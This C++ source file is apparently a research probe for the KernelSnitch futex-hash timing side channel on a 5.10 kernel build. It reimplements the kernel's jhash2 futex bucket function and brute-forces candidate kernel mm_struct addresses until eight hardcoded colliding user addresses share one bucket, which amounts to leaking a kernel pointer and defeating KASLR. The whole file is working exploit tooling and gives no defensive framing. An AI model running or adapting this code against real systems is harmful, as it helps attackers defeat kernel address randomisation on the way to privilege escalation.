/*
 * KernelSnitch match-paradox probe (katyusha 5.10.101).
 *
 * Hardcodes the 8 verified-collider addresses from ghostlock-run-20261011-3.log
 * (same-bucket proven by drain/repile timing) and brute-forces which mm value
 * unifies their model hash buckets. Prints any full match (both the -16
 * patched and the unpatched jhash2 semantics) with its lattice residue, plus
 * the best partial match counts. This discriminates:
 *   (a) a full match at a non-slab-lattice position  -> scan lattice bug
 *   (b) a full match with unpatched semantics only    -> hash compensation wrong
 *   (c) no full match anywhere                        -> hash model still wrong
 *   (d) full match at expected lattice with -16       -> earlier scan had a bug
 */
#include <atomic>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <mutex>
#include <thread>
#include <vector>

namespace {

using u32 = uint32_t;
using u64 = uint64_t;

inline u32 rol32(u32 word, u32 shift) {
    return (word << (shift & 31)) | (word >> ((-shift) & 31));
}

inline void jhash_mix(u32 &a, u32 &b, u32 &c) {
    a -= c; a ^= rol32(c, 4);  c += b;
    b -= a; b ^= rol32(a, 6);  a += c;
    c -= b; c ^= rol32(b, 8);  b += a;
    a -= c; a ^= rol32(c, 16); c += b;
    b -= a; b ^= rol32(a, 19); a += c;
    c -= b; c ^= rol32(b, 4);  b += a;
}

inline u32 jhash_final(u32 a, u32 b, u32 c) {
    c ^= b; c -= rol32(b, 14);
    a ^= c; a -= rol32(c, 11);
    b ^= a; b -= rol32(a, 25);
    c ^= b; c -= rol32(b, 16);
    a ^= c; a -= rol32(c, 4);
    b ^= a; b -= rol32(a, 14);
    c ^= b; c -= rol32(b, 24);
    return c;
}

/* jhash2 over the 4-word futex key {mm, page} with initval. */
inline u32 key_hash(u64 mm, u64 addr, u32 initval) {
    u32 k0 = (u32) mm, k1 = (u32) (mm >> 32);
    u64 page = addr & ~0xfffULL;
    u32 k2 = (u32) page, k3 = (u32) (page >> 32);
    u32 base = 0xdeadbeefu + initval;
    u32 a = k0 + base, b = k1 + base, c = k2 + base;
    jhash_mix(a, b, c);
    a += k3;
    return jhash_final(a, b, c);
}

inline u32 bucket(u64 mm, u64 addr, u32 initval_delta) {
    u32 off = (u32) (addr & 0xfff);
    return key_hash(mm, addr, off + initval_delta) & 2047u;
}

const u64 kTarget = 0x0000007e82d940d0ULL;
const u64 kColliders[7] = {
    0x0000006b74446a10ULL, 0x0000006b702a5d08ULL, 0x0000006b7464ca40ULL,
    0x0000006b742e4f00ULL, 0x0000006b74900fe0ULL, 0x0000006b70f0b038ULL,
    0x0000006b720e0ee0ULL,
};

constexpr u64 kBase = 0xffffff8000000000ULL;

struct Hit {
    u64 mm;
    int variant; // 0 = -16 patched, 1 = unpatched
};

} // namespace

int main(int argc, char **argv) {
    u64 span = argc > 1 ? strtoull(argv[1], nullptr, 0) : 0x400000000ULL; // 16GB
    int threads = argc > 2 ? atoi(argv[2]) : 8;
    std::vector<Hit> hits;
    std::mutex hits_mu;
    std::atomic<u64> best0{0}, best1{0};
    std::atomic<int> done{0};

    auto work = [&](int id) {
        u64 local_best0 = 0, local_best1 = 0;
        std::vector<Hit> local_hits;
        for (u64 mm = kBase + (u64) id * 64; mm < kBase + span; mm += (u64) threads * 64) {
            int n0 = 1, n1 = 1;
            for (int i = 0; i < 7; ++i) {
                if (bucket(mm, kTarget, (u32) -16) == bucket(mm, kColliders[i], (u32) -16)) ++n0;
                if (bucket(mm, kTarget, 0) == bucket(mm, kColliders[i], 0)) ++n1;
            }
            if (n0 == 8) local_hits.push_back({mm, 0});
            if (n1 == 8) local_hits.push_back({mm, 1});
            if ((u64) n0 > local_best0) local_best0 = (u64) n0;
            if ((u64) n1 > local_best1) local_best1 = (u64) n1;
        }
        u64 b = best0.load();
        while (local_best0 > b && !best0.compare_exchange_weak(b, local_best0)) {}
        b = best1.load();
        while (local_best1 > b && !best1.compare_exchange_weak(b, local_best1)) {}
        if (!local_hits.empty()) {
            std::lock_guard<std::mutex> lk(hits_mu);
            hits.insert(hits.end(), local_hits.begin(), local_hits.end());
        }
        done.fetch_add(1);
    };

    std::vector<std::thread> pool;
    for (int i = 0; i < threads; ++i) pool.emplace_back(work, i);
    for (auto &t : pool) t.join();

    printf("scanned %#llx bytes step 64, best partial: patched=%llu/8 unpatched=%llu/8\n",
           (unsigned long long) span,
           (unsigned long long) best0.load(), (unsigned long long) best1.load());
    for (const Hit &h : hits) {
        printf("FULL MATCH variant=%s mm=%#llx residue32k=%#llx\n",
               h.variant ? "unpatched" : "patched", (unsigned long long) h.mm,
               (unsigned long long) (h.mm & 0x7fff));
    }
    return hits.empty() ? 1 : 0;
}
